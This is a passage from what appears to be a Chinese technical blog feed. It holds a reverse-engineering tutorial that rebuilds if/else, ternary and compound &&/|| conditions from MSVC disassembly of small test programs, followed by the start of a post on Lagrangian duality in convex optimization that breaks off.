printf</span><br><span class="line">.text:0040100E</span><br><span class="line">.text:00401013                 add     esp, 4</span><br><span class="line">.text:00401016                 xor     eax, eax</span><br><span class="line">.text:00401018                 retn</span><br><span class="line">.text:00401018</span><br><span class="line">.text:00401019 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401019</span><br><span class="line">.text:00401019 ELSE_IF:                                ; CODE XREF: _main+7j</span><br><span class="line">.text:00401019                 test    eax, eax</span><br><span class="line">.text:0040101B                 jge     short ELSE</span><br><span class="line">.text:0040101B</span><br><span class="line">.text:0040101D                 push    offset s-&gt;Argc&lt;0 ; &quot;argc &lt; 0\n&quot;</span><br><span class="line">.text:00401022                 call    printf</span><br><span class="line">.text:00401022</span><br><span class="line">.text:00401027                 add     esp, 4</span><br><span class="line">.text:0040102A                 xor     eax, eax</span><br><span class="line">.text:0040102C                 retn</span><br><span class="line">.text:0040102C</span><br><span class="line">.text:0040102D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040102D</span><br><span class="line">.text:0040102D ELSE:                                   ; CODE XREF: _main+1Bj</span><br><span class="line">.text:0040102D                 push    offset s-&gt;Argc&gt;0AndArgc&lt;2 ; &quot;argc &gt;= 0 and argc &lt;= 2\n&quot;</span><br><span class="line">.text:00401032                 call    printf</span><br><span class="line">.text:00401032</span><br><span class="line">.text:00401037                 add     esp, 4</span><br><span class="line">.text:0040103A                 xor     eax, eax</span><br><span class="line">.text:0040103C                 retn</span><br><span class="line">.text:0040103C</span><br><span class="line">.text:0040103C _main           endp</span><br></pre></td></tr></table></figure><p>使用的是公共代码优化和<code>jcc</code>指令来实现的多分支结果，其还原方法还是对<code>jcc</code>的条件取反再进行还原即可。</p><h2 id="三目运算的分析"><a href="#三目运算的分析" class="headerlink" title="三目运算的分析"></a>三目运算的分析</h2><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, argc &gt; <span class="number">2</span> ? argc - <span class="number">1</span> : argc + <span class="number">10</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VS2019</code>的<code>MSVC</code>的反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00401046                 mov     edx, 0Ah</span><br><span class="line">.text:0040104B                 cmp     [ebp+argc], 2</span><br><span class="line">.text:0040104F                 cmovle  ecx, edx</span><br><span class="line">.text:00401052                 add     ecx, [ebp+argc]</span><br><span class="line">.text:00401055                 push    ecx</span><br><span class="line">.text:00401056                 push    offset _Format  ; &quot;%d\n&quot;</span><br><span class="line">.text:0040105B                 call    _printf</span><br><span class="line">.text:00401060                 add     esp, 8</span><br><span class="line">.text:00401063                 xor     eax, eax</span><br><span class="line">.text:00401065                 pop     ebp</span><br><span class="line">.text:00401066                 retn</span><br><span class="line">.text:00401066 _main           endp</span><br></pre></td></tr></table></figure><p>使用的还是条件赋值指令，提高运行速度。对于其还原只需要关注条件赋值指令，它本质上的逻辑还是先假设一个条件预先成立，然后再判断其余剩下的条件，根据条件成立与否来进行值的替换。</p><h1 id="补充：对于复杂条件的分支结构的识别与还原"><a href="#补充：对于复杂条件的分支结构的识别与还原" class="headerlink" title="补充：对于复杂条件的分支结构的识别与还原"></a>补充：对于复杂条件的分支结构的识别与还原</h1><p>在写代码的过程中，最常见的就是经过逻辑与和逻辑或来进行条件组合。那么对于这些复杂的条件如何识别和还原呢？先对与条件、或条件的单独情况进行观察分析，然后再对复杂的组合条件来进行分析。</p><h2 id="与条件"><a href="#与条件" class="headerlink" title="与条件"></a>与条件</h2><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (argv != <span class="literal">nullptr</span> &amp;&amp; argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argv != nullptr &amp;&amp; argc &gt; 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VS2019</code>的<code>MSVC</code>下的反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 cmp     [ebp+argv], 0</span><br><span class="line">.text:00401047                 jz      short EXIT_PROGRAM</span><br><span class="line">.text:00401049                 cmp     [ebp+argc], 2</span><br><span class="line">.text:0040104D                 jle     short EXIT_PROGRAM</span><br><span class="line">.text:0040104F                 push    offset _Format  ; &quot;argv != nullptr &amp;&amp; argc &gt; 2\n&quot;</span><br><span class="line">.text:00401054                 call    _printf</span><br><span class="line">.text:00401059                 add     esp, 4</span><br><span class="line">.text:0040105C</span><br><span class="line">.text:0040105C EXIT_PROGRAM:                           ; CODE XREF: _main+7↑j</span><br><span class="line">.text:0040105C                                         ; _main+D↑j</span><br><span class="line">.text:0040105C                 xor     eax, eax</span><br><span class="line">.text:0040105E                 pop     ebp</span><br><span class="line">.text:0040105F                 retn</span><br><span class="line">.text:0040105F _main           endp</span><br></pre></td></tr></table></figure><p>可以观察到，对于多个<code>jcc</code>指令后面的标号都有一个统一的标号。这个特点符合逻辑运算的性质，即：对于用与运算连接的逻辑表达式而言，如果一个条件为假，则整个表达式为假。因此<code>jcc</code>后面的标号是退出条件体的标号，而退出标号和最后一条<code>jcc</code>指令之间的代码则是条件体内的代码。</p><p>还原方法则是：</p><ul><li>将<code>jcc</code>的各个条件取反</li><li>将各个条件使用<code>&amp;&amp;</code>进行组合</li><li>还原条件体内的代码即可</li></ul><h2 id="或条件"><a href="#或条件" class="headerlink" title="或条件"></a>或条件</h2><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (argv != <span class="literal">nullptr</span> || argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argv != nullptr || argc &gt; 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VS2019</code>的<code>MSVC</code>下的反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043</span><br><span class="line">.text:00401043 IF_BEGIN:</span><br><span class="line">.text:00401043                 cmp     [ebp+argv], 0</span><br><span class="line">.text:00401047                 jnz     short IF_BODY</span><br><span class="line">.text:00401049                 cmp     [ebp+argc], 2</span><br><span class="line">.text:0040104D                 jle     short EXIT_PROGRAM</span><br><span class="line">.text:0040104F</span><br><span class="line">.text:0040104F IF_BODY:                                ; CODE XREF: _main+7↑j</span><br><span class="line">.text:0040104F                 push    offset _Format  ; &quot;argv != nullptr || argc &gt; 2\n&quot;</span><br><span class="line">.text:00401054                 call    _printf</span><br><span class="line">.text:00401059                 add     esp, 4</span><br><span class="line">.text:0040105C</span><br><span class="line">.text:0040105C EXIT_PROGRAM:                           ; CODE XREF: _main+D↑j</span><br><span class="line">.text:0040105C                 xor     eax, eax</span><br><span class="line">.text:0040105E                 pop     ebp</span><br><span class="line">.text:0040105F                 retn</span><br><span class="line">.text:0040105F _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，其代码特征是：</p><ul><li>除了最后一个<code>jcc</code>外，后面的标号都是指向同一个条件体内的代码块的起始位置</li><li>最后一个<code>jcc</code>后的标号为退出条件体的代码块的起始位置</li></ul><p>上述代码特征符合或运算的逻辑表达式性质：对于用或连接的逻辑表达式而言，如果一个条件成立，整个表达式为真。</p><p>还原时，只需要：</p><ul><li>除了最后一个<code>jcc</code>的条件需要取反以外，其余的<code>jcc</code>条件都不取反</li><li>使用或运算连接各个条件</li><li>还原条件体内的代码</li></ul><h2 id="与运算和或运算的组合"><a href="#与运算和或运算的组合" class="headerlink" title="与运算和或运算的组合"></a>与运算和或运算的组合</h2><p>对于组合的情况，其会将各种优化手段用上，我们需要做的就是去掉这些优化，来还原代码。</p><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (argv != <span class="literal">nullptr</span> &amp;&amp; argc != <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, argc + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span> || argc == *(<span class="keyword">int</span>*)(*argv)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argv is not nullptr and argc == argv&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VS2019</code>的<code>MSVC</code>下的反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 mov     edx, [ebp+argv]</span><br><span class="line">.text:00401046                 mov     ecx, [ebp+argc]</span><br><span class="line">.text:00401049                 test    edx, edx</span><br><span class="line">.text:0040104B                 jz      short loc_401067</span><br><span class="line">.text:0040104D                 cmp     ecx, 1</span><br><span class="line">.text:00401050                 jz      short loc_40106C</span><br><span class="line">.text:00401052                 lea     eax, [ecx+1]</span><br><span class="line">.text:00401055                 push    eax</span><br><span class="line">.text:00401056                 push    offset _Format  ; &quot;%d\n&quot;</span><br><span class="line">.text:0040105B                 call    _printf</span><br><span class="line">.text:00401060                 add     esp, 8</span><br><span class="line">.text:00401063                 xor     eax, eax</span><br><span class="line">.text:00401065                 pop     ebp</span><br><span class="line">.text:00401066                 retn</span><br><span class="line">.text:00401067 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401067</span><br><span class="line">.text:00401067 loc_401067:                             ; CODE XREF: _main+B↑j</span><br><span class="line">.text:00401067                 cmp     ecx, 2</span><br><span class="line">.text:0040106A                 jz      short loc_401084</span><br><span class="line">.text:0040106C</span><br><span class="line">.text:0040106C loc_40106C:                             ; CODE XREF: _main+10↑j</span><br><span class="line">.text:0040106C                 mov     eax, [edx]</span><br><span class="line">.text:0040106E                 cmp     ecx, [eax]</span><br><span class="line">.text:00401070                 jz      short loc_401084</span><br><span class="line">.text:00401072                 push    edx</span><br><span class="line">.text:00401073                 push    offset aP       ; &quot;%p\n&quot;</span><br><span class="line">.text:00401078                 call    _printf</span><br><span class="line">.text:0040107D                 add     esp, 8</span><br><span class="line">.text:00401080                 xor     eax, eax</span><br><span class="line">.text:00401082                 pop     ebp</span><br><span class="line">.text:00401083                 retn</span><br><span class="line">.text:00401084 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401084</span><br><span class="line">.text:00401084 loc_401084:                             ; CODE XREF: _main+2A↑j</span><br><span class="line">.text:00401084                                         ; _main+30↑j</span><br><span class="line">.text:00401084                 push    offset aArgvIsNotNullp ; &quot;argv is not nullptr and argc == argv&quot;</span><br><span class="line">.text:00401089                 call    _printf</span><br><span class="line">.text:0040108E                 add     esp, 4</span><br><span class="line">.text:00401091                 xor     eax, eax</span><br><span class="line">.text:00401093                 pop     ebp</span><br><span class="line">.text:00401094                 retn</span><br><span class="line">.text:00401094 _main           endp</span><br></pre></td></tr></table></figure><p>可以观察到上面的反汇编结果好像与上面分析的没有几个是一样的，怎么办呢？一点点的看。首先观察第一个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00401043                 mov     edx, [ebp+argv]</span><br><span class="line">.text:00401046                 mov     ecx, [ebp+argc]</span><br><span class="line">.text:00401049                 test    edx, edx</span><br><span class="line">.text:0040104B                 jz      short loc_401067</span><br><span class="line">.text:0040104D                 cmp     ecx, 1</span><br><span class="line">.text:00401050                 jz      short loc_40106C</span><br><span class="line">.text:00401052                 lea     eax, [ecx+1]</span><br><span class="line">.text:00401055                 push    eax</span><br><span class="line">.text:00401056                 push    offset _Format  ; &quot;%d\n&quot;</span><br><span class="line">.text:0040105B                 call    _printf</span><br><span class="line">.text:00401060                 add     esp, 8</span><br><span class="line">.text:00401063                 xor     eax, eax</span><br><span class="line">.text:00401065                 pop     ebp</span><br><span class="line">.text:00401066                 retn</span><br></pre></td></tr></table></figure><p>可以发现其既不像与运算连接的条件（没有统一的退出标号）也不像或运算连接的条件（没有统一的入口标号），所以需要模拟执行。模拟执行后可以发现<code>test    edx, edx</code>和<code>cmp     ecx, 1</code>是与条件，因为只有他们两个都不成立的情况下，才能执行条件体内的代码。继续向下查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:00401067 loc_401067:     ;  test    edx, edx    jz      short loc_401067 edx == argv</span><br><span class="line">.text:00401067                 cmp     ecx, 2</span><br><span class="line">.text:0040106A                 jz      short ELSE_BEGIN</span><br><span class="line">.text:0040106C</span><br><span class="line">.text:0040106C loc_40106C:     ;  cmp     ecx, 1      jz      short loc_40106C ecx == argc</span><br><span class="line">.text:0040106C                 mov     eax, [edx]</span><br><span class="line">.text:0040106E                 cmp     ecx, [eax]</span><br><span class="line">.text:00401070                 jz      short ELSE_BEGIN</span><br><span class="line">.text:00401072                 push    edx</span><br><span class="line">.text:00401073                 push    offset aP       ; &quot;%p\n&quot;</span><br><span class="line">.text:00401078                 call    _printf</span><br><span class="line">.text:0040107D                 add     esp, 8</span><br><span class="line">.text:00401080                 xor     eax, eax</span><br><span class="line">.text:00401082                 pop     ebp</span><br><span class="line">.text:00401083                 retn</span><br><span class="line">.text:00401084 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401084</span><br><span class="line">.text:00401084 ELSE_BEGIN:                             ; CODE XREF: _main+2A↑j</span><br><span class="line">.text:00401084                                         ; _main+30↑j</span><br><span class="line">.text:00401084                 push    offset aArgvIsNotNullp ; &quot;argv is not nullptr and argc == argv&quot;</span><br><span class="line">.text:00401089                 call    _printf</span><br><span class="line">.text:0040108E                 add     esp, 4</span><br><span class="line">.text:00401091                 xor     eax, eax</span><br><span class="line">.text:00401093                 pop     ebp</span><br><span class="line">.text:00401094                 retn</span><br></pre></td></tr></table></figure><p>这块代码块好像与条件的特征，但是它真的是吗？如果是与条件相连接的话，它们就应该是一个整体，条件判断的入口应该都是标号<code>loc_401067</code>的位置。虽然它们都有统一的退出出口，但是进入这个条件的入口却不是相同的，因此这两个条件判断不是与运算连接的。那么它们是什么呢？需要模拟执行一下。当两个条件各自成立时，发现有共同的入口，符合用或条件连接的代码特征，且与上面的判断条件有多个入口逻辑上可以解释的通顺，则可以判定其为或条件连接的代码特征。</p><p>综上，可以还原出代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argv != <span class="literal">nullptr</span> &amp;&amp; argc != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, argc + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span> || argc == *(<span class="keyword">int</span>*)argv) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv is not nullptr and argc == argv&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, argv);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析还原出来的代码和源代码进行比较，发现其在逻辑上是等价的，故还原的没有问题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;结构化程序设计的三大结构，分别是：&lt;strong&gt;顺序结构、选择结构和循环结构&lt;/strong&gt;。这三种基本结构可以任意组合，形成多姿多彩的程序世界。在这其中的顺序结构是按照代码编写的顺序逐步执行；而选择结构打断了这种顺序，让程序支持了逻辑条件。因此，可以识别与还原选择结构</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="选择结构" scheme="https://4st.tech/tags/%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84/"/>
    
    <category term="分支结构" scheme="https://4st.tech/tags/%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/"/>
    
    <category term="条件转移" scheme="https://4st.tech/tags/%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB/"/>
    
    <category term="if" scheme="https://4st.tech/tags/if/"/>
    
    <category term="else if" scheme="https://4st.tech/tags/else-if/"/>
    
    <category term="if...else" scheme="https://4st.tech/tags/if-else/"/>
    
  </entry>
  
  <entry>
    <title>机器学习：凸优化中的对偶</title>
    <link href="https://4st.tech/2021/08/18/ji-qi-xue-xi-tu-you-hua-zhong-de-dui-ou/"/>
    <id>https://4st.tech/2021/08/18/ji-qi-xue-xi-tu-you-hua-zhong-de-dui-ou/</id>
    <published>2021-08-18T06:34:47.000Z</published>
    <updated>2021-08-18T06:58:47.042Z</updated>
    
    <content type="html"><![CDATA[<h1>涉及到的知识点</h1><ul><li>Lower bound property</li><li>Strong and Weak Duality</li><li>Complementary Slackness</li><li>KKT Conditions</li></ul><p>对于KKT Conditions，把它放到了SVM中去讲解，本文不再赘述。</p><h1>Primal Problem &amp; Dual Problem</h1><p>原始问题（Primal Problem）和对偶问题（Dual Problem）是对一个问题的不同角度上的理解，任何一个原始问题都可以转换为与之对应的对偶问题。</p><p>举个例子，就像初中时学过的三视图一样，你从正面观察得到的正视图是一个样子，从侧面观察的左视图和从上面观察的俯视图是另外一个样子。根据这些不同的视图就可以唯一确定出来这个物体的立体形状。</p><p><img src="https://raw.githubusercontent.com/m-Onst/pics/main/blog/202108/box.png" alt=""></p><p>原始问题就相当于是从正面、左侧面和上面俯视得到的三视图；而对偶问题就相当于从背面、下面和右侧面观察得到的三视图，它们是同一问题的从不同方面的表述。</p><p>根据上述的举例，可以直观的感觉出来：任何一个原始问题从原则上来讲，都可以将其转换为与之对应的对偶问题，然后求解这个对偶问题得出来的解经过一些调整来得到原始问题的解。上述表述在凸优化中就对应着拉格朗日对偶问题。</p><h1>拉格朗日对偶问题</h1><h2 id="一般优化问题的标准形式转为对偶问题">一般优化问题的标准形式转为对偶问题</h2><p>将给定一般优化问题的标准形式：</p><p style=""><img src="https://math.now.sh?from=%5Cbegin%7Bequation%7D%20%5Cbegin%7Baligned%7D%20%5Cmin%20%5Cquad%20%26f_0%28x%29%20%5C%5C%20s.t.%20%5Cquad%20%20%26g_i(x)%20%26%5Cle%200%2C%20%26i%20%3D%20%5C%7B1%2C%202%2C%203%2C%20...%2C%20m%5C%7D%20%5C%5C%20%26h_j(x)%20%26%3D0%2C%20%26j%20%3D%20%5C%7B1%2C%202%2C%203%2C%20...%2C%20n%5C%7D%20%5Cend%7Baligned%7D%20%5Cend%7Bequation%7D%0A" /></p><p>转为拉格朗日函数的形式：</p><p style=""><img src="https://math.now.sh?from=L%28x%2C%20%5Clambda%2C%20%5Cnu%29%20%3D%20f_0(x)%20%2B%20%5Clambda%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i(x)%20%2B%20%5Cnu%5Csum%5E%7Bn%7D_%7Bj%20%3D%201%7Dh_j(x)%5Cquad%20(%5Clambda%20%5Cge%200%2C%20%5Cnu%20%5Cge%200)%0A" /></p><p>最后将拉格朗日函数的形式转为对应的拉格朗日对偶函数：</p><p style=""><img src="https://math.now.sh?from=%5Cbegin%7Bequation%7D%20%5Cbegin%7Baligned%7D%20g%28%5Clambda%2C%20%5Cnu%29%20%26%3D%20%5Cinf_xL(x%2C%20%5Clambda%2C%20%5Cnu)%20%5C%5C%20%26%3D%5Cinf_x%5Bf_0(x)%20%2B%20%5Clambda%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i(x)%20%2B%20%5Cnu%5Csum%5E%7Bn%7D_%7Bj%20%3D%201%7Dh_j(x)%5D%20%5Cend%7Baligned%7D%20%5Cend%7Bequation%7D%0A" /></p><p>其中<img src="https://math.now.sh?inline=%5Clambda%20%5Cge%200%2C%20%5Cnu%20%5Cge%200" style="display:inline-block;margin: 0;"/>。上述拉格朗日对偶函数为什么只有两个参数<img src="https://math.now.sh?inline=%5Clambda%2C%5Cnu" style="display:inline-block;margin: 0;"/>了呢？因为<img src="https://math.now.sh?inline=%5Cinf" style="display:inline-block;margin: 0;"/>是将<img src="https://math.now.sh?inline=L%28x%2C%20%5Clambda%2C%20%5Cnu%29" style="display:inline-block;margin: 0;"/>取得最小值时对应的自变量的取值<img src="https://math.now.sh?inline=x" style="display:inline-block;margin: 0;"/>代入进去，所得到的一个函数式子。此时的<img src="https://math.now.sh?inline=f_0%28x%29%2C%20g_i(x)%2Ch_j(x)" style="display:inline-block;margin: 0;"/>均为常量了，因此上式中只有两个参数，且为一个仿射函数。</p><h2 id="拉格朗日对偶函数">拉格朗日对偶函数</h2><p>根据上述描述，可以得知拉格朗日对偶函数是一个仿射函数，而任何一个仿射函数既是凸函数又是凹函数，所以可以将任意的标准形式的优化问题转换为与之对应的拉格朗日对偶函数问题。</p><h3 id="Lower-Bound-Property">Lower Bound Property</h3><p>设<img src="https://math.now.sh?inline=x%5E*" style="display:inline-block;margin: 0;"/>是原始问题<img src="https://math.now.sh?inline=f_0%28x%29" style="display:inline-block;margin: 0;"/>的最优解，其函数值<img 